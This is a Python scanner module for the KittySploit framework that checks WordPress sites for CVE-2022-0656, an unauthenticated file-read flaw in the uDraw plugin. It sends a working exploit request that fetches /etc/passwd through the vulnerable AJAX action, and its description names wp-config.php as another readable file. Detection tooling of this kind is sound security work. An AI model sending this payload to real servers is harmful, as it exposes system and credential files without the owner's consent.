#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""uDraw before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'uDraw <3.3.3 - Local File Inclusion Detection',
        'description': 'uDraw before 3.3.3 does not validate the url parameter in its udraw_convert_url_to_base64 AJAX action (available to both unauthenticated and authenticated users) before using it in the file_get_contents function and returning its content base64 encoded in the response. As a result, unauthenticated users could read arbitrary files on the web server (such as /etc/passwd, wp-config.php etc).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp', 'wordpress', 'wp-plugin', 'unauth', 'lfi', 'udraw', 'wpscan', 'webtoprint', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/925c4c28-ae94-4684-a365-5f1e34e6c151',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0656',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-0656',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'}, data='action=udraw_convert_url_to_base64&url=/etc/passwd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('cm9vd', 'data:image\\/;base64',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='uDraw <3.3.3 - Local File Inclusion detected', path=path)
            return True
        return False

